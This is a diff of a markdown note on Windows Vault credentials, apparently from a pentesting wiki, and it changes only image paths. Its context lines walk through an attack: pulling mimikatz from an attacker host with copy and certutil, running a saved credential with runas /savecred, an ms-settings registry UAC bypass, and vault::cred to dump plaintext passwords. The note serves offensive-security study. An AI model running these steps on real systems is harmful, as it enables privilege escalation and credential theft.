@@ -12,7 +12,7 @@
 
 Each vault folder contains a `Policy.vpol` file with AES keys (AES-128 or AES-256) that is protected by DPAPI. These AES keys are used to encrypt the credentials. Newer versions of Windows make use of `Credential Guard` to further protect the DPAPI master keys by storing them in secured memory enclaves ([Virtualization-based Security](https://learn.microsoft.com/en-us/windows-hardware/design/device-experiences/oem-vbs)).
 
-<figure><img src="../../../../.gitbook/assets/image (497).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/image (1369).png" alt=""><figcaption></figcaption></figure>
 
 It is possible to export Windows Vaults to `.crd` files either via Control Panel or with the following command. Backups created this way are encrypted with a password supplied by the user, and can be imported on other Windows systems.
 
@@ -20,7 +20,7 @@ It is possible to export Windows Vaults to `.crd` files either via Control Panel
 C:\Users\sadams>rundll32 keymgr.dll,KRShowKeyMgr
 ```
 
-<figure><img src="../../../../.gitbook/assets/image (498).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/image (1370).png" alt=""><figcaption></figcaption></figure>
 
 ### Enumerating credentials with cmdkey
 
@@ -144,7 +144,7 @@ Now weak up a samba server to share it file to win `\\10.10.14.118\share` -->
 copy \\10.10.14.118\share\x64\mimikatz.exe .
 ```
 
-<figure><img src="../../../../.gitbook/assets/image (499).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/image (1371).png" alt=""><figcaption></figcaption></figure>
 
 But they give us an error... so... see the creds saved into the machine :
 
@@ -161,7 +161,7 @@ Password User: SRV01\ mcharles
 runas /savecred /user:SRV01\mcharles cmd
 ```
 
-<figure><img src="../../../../.gitbook/assets/image (500).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/image (1372).png" alt=""><figcaption></figcaption></figure>
 
 We are now mcharles user, now use UAC bypass -->
 
@@ -174,7 +174,7 @@ reg add HKCU\Software\Classes\ms-settings\shell\open\command /f /ve /t REG_SZ /d
 reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ /d "" /f && reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /ve /t REG_SZ /d "cmd.exe" /f && start computerdefaults.exe
 ```
 
-<figure><img src="../../../../.gitbook/assets/image (501).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/image (1373).png" alt=""><figcaption></figcaption></figure>
 
 Now we have a cmd such as administrator and we can read the folder, so... now upload the mimikatz -->
 
@@ -203,7 +203,7 @@ certutil -urlcache -f http://10.10.14.118:8000/x64/mimikatz.exe mimikatz.exe
 
 Once we have download mimikatz, execute it: `mimikatz.exe` -->
 
-<figure><img src="../../../../.gitbook/assets/image (502).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/image (1374).png" alt=""><figcaption></figcaption></figure>
 
 See all credentials in text plain -->
 
@@ -211,4 +211,4 @@ See all credentials in text plain -->
 vault::cred
 ```
 
-<figure><img src="../../../../.gitbook/assets/image (503).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/image (1375).png" alt=""><figcaption></figcaption></figure>
